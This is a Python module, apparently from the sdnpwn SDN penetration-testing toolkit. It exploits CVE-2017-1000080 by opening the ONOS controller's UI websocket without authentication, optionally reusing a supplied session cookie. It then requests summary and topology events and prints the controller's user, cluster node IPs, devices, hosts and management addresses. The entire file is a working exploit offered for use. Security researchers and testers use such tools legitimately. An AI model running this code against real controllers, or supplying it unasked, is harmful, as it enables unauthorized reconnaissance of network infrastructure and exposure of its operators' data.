
import signal
import websocket
import json
from threading import Thread
import modules.sdnpwn_common as sdnpwn
import tabulate

updatePrefsReq = '{"event":"updatePrefReq","payload":{"key":"topo_prefs","value":{"insts":1,"summary":1,"detail":1,"hosts":0,"offdev":1,"dlbls":0,"porthl":1,"bg":0,"spr":0,"ovid":"traffic","toolbar":0}}}'
requestSummary = '{"event":"requestSummary","payload":{}}'
topoSelectOverlay = '{"event":"topoSelectOverlay","payload":{"activate":"traffic"}}'
topoStart = '{"event":"topoStart","payload":{}}'

def signal_handler(signal, frame):
  #Handle Ctrl+C here
  print("")
  sdnpwn.message("Stopping...", sdnpwn.NORMAL)
  exit(0)

def info():
  return "Attempts to connect to the ONOS websocket without authentication (CVE-2017-1000080). Will dump observed events from the websocket."
  
def usage():
  sdnpwn.addUsage(["-t", "--target"], "IP address of controller", True)
  sdnpwn.addUsage(["-p", "--port"], "Websocket port (Default 8181)", False)
  sdnpwn.addUsage(["-c", "--cookie"], "Add cookie (like 'JSESSIONID=1sz99uvm1z2971t18f55lmpc0d')", False)
  sdnpwn.addUsage(["-s", "--summary"], "Request Summary events", False)
  sdnpwn.addUsage(["-d", "--topo"], "Request Topology events", False)
  sdnpwn.addUsage(["-b", "--pretty"], "Print event information in a human readable format", False)
  
  #sdnpwn.addUsage(["-k", "--keep-alive"], "Keep websocket open and receive new events", False)
  
  return sdnpwn.getUsage()

def onOpen(ws):
  sdnpwn.printSuccess("Connected to websocket!")
  #Thread(target=requestEvents, args=(ws,)).start()
  requestEvents(ws)

def onMessage(ws, msgJSON):
  msg = json.loads(msgJSON)
  if(sdnpwn.checkArg(["-b", "--pretty"], ws.sdnpwn_params)):
    parseMessage(msg)
  else:
    print(json.dumps(msg, indent=4, sort_keys=True))
    ws.sdnpwn_expected_events -= 1
  
def onError(ws, err):
  sdnpwn.printError("Got error: " + str(err))
  
def onClose(ws):
  sdnpwn.printWarning("Connection to websocket closed!")

def requestEvents(ws):
  if(sdnpwn.checkArg(["-s", "--summary"], ws.sdnpwn_params) == True):
    ws.send(requestSummary)
    ws.sdnpwn_expected_events += 1
  if(sdnpwn.checkArg(["-d", "--topo"], ws.sdnpwn_params) == True):
    ws.send(topoStart)
    ws.sdnpwn_expected_events += 1 #Number of events will depend on number of devices. Need to revise exit strategy after data dump
  #if(sdnpwn.checkArg(["-k", "--keep-alive"], ws.sdnpwn_params) == False):
    #while(ws.sdnpwn_expected_events != 0):
      #pass
    #sdnpwn.printNormal("Closing Websocket")
    #ws.close()

def parseMessage(msg):
  event = msg['event']
  eventHandler = {
                  'showSummary': parseSummary,
                  'bootstrap': parseBootstrap,
                  'addDevice': parseDevice,
                  'addHost': parseHost,
                  'topoStartDone': (lambda m: m)
                  }
  eventHandler[event](msg)
  
def parseBootstrap(msg):
  user = msg['payload']['user']
  print("User: " + msg['payload']['user'])
  print("Cluster Nodes: " + str(len(msg['payload']['clusterNodes'])))
  for c in msg['payload']['clusterNodes']:
    print("    ID: " + c['id'])
    print("    IP: " + c['ip'])
    print("    Attached: " + str(c['m_uiAttached']))
    print("")
  #print(payload)
  
def parseSummary(msg):
  print(msg['payload']['title'] + " Update:")
  print("      Version: " + msg['payload']['props']['Version'])
  print("      Devices: " + msg['payload']['props']['Devices'])
  print("      Hosts: " + msg['payload']['props']['Hosts'])
  print("      Links: " + msg['payload']['props']['Links'])
  print("      Intents: " + msg['payload']['props']['Intents'])
  print("      Tunnels: " + msg['payload']['props']['Tunnels'])
  print("      Topology SCCs: " + msg['payload']['props']['Topology SCCs'])
  #print(msg)
  
def parseDevice(msg):
  print("New Device:")
  print("      Type: " + msg['payload']['type'])
  print("      ID: " + msg['payload']['id'])
  print("      Master: " + msg['payload']['master'])
  print("      Online: " + str(msg['payload']['online']))
  print("      Channel ID: " + msg['payload']['props']['channelId'])
  print("      IP Address: " + msg['payload']['props']['managementAddress'])
  print("      Protocol: " + msg['payload']['props']['protocol'])
  print("      Labels: " + str(msg['payload']['labels']))
  
def parseHost(msg):
  print("New Host:")
  print("      Type: " + msg['payload']['type'])
  print("      ID: " + msg['payload']['id'])
  print("      Labels: " + str(msg['payload']['labels']))
  print("      Connection Point: ")
  print("            Device: " + msg['payload']['cp']['device'])
  print("            Port: " + str(msg['payload']['cp']['port']))
  print("      Ingress: " + msg['payload']['ingress'])
  print("      Engress: " + msg['payload']['egress'])

def run(params):
  signal.signal(signal.SIGINT, signal_handler) #Assign the signal handler
  
  if(sdnpwn.checkArg(["-t", "--target"], params)):
    
    port = str(sdnpwn.getArg(["-p", "--port"], params, 8181))
    cookie = sdnpwn.getArg(["-c", "--cookie"], params, None)
    
    wsURL = "ws://" + sdnpwn.getArg(["-t", "--target"], params) + ":" + port + "/onos/ui/websock/core"
    #websocket.enableTrace(True)
    ws = websocket.WebSocketApp(wsURL)
    ws.on_open = onOpen
    ws.on_message = onMessage
    ws.on_error = onError
    ws.on_close = onClose
    ws.sdnpwn_params = params
    ws.sdnpwn_expected_events = 1 #Execting initial bootstrap event
    
    if(cookie is not None):
      ws.cookie = cookie
    
    sdnpwn.printNormal("Attempting connection to " + wsURL)
    
    ws.run_forever()

  else:
    print(usage())
    
